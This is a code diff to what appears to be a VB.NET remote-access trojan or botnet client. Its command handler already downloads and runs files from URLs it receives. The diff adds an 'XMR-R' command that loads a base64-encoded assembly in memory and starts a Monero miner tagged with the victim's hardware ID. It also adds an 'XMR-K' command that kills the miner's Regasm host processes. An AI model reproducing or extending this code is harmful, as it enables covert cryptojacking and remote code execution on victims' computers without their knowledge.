@@ -1,6 +1,6 @@
 ﻿Public Class Main
 
-    Public Shared Sub MISC(ByVal CMD As String)
+    Public Shared Sub MISC(ByVal HWID As String, ByVal CMD As String)
         On Error Resume Next
         Dim A As String() = Split(CMD, "|'P'|")
         Select Case A(0)
@@ -44,6 +44,28 @@
                 WC.DownloadFile(A(1), NewFile)
                 Threading.Thread.CurrentThread.Sleep(1000)
                 Diagnostics.Process.Start(NewFile)
+
+
+            Case "XMR-R"
+
+                For Each Type_ As Type In System.AppDomain.CurrentDomain.Load(Convert.FromBase64String(A(5))).GetTypes
+                    For Each GM In Type_.GetMethods
+                        If GM.Name = "XM" Then
+                            If A(1) = "50%" Then
+                                A(1) = Environment.ProcessorCount / 2
+                            End If
+                            If A(4) = "ID%" Then
+                                A(4) = HWID
+                            End If
+                            GM.Invoke(Nothing, New Object() {A(1), A(2), A(3), A(4)})
+                        End If
+                    Next
+                Next
+
+            Case "XMR-K"
+                For Each P As Process In System.Diagnostics.Process.GetProcessesByName("Regasm")
+                    P.Kill()
+                Next
         End Select
     End Sub
 
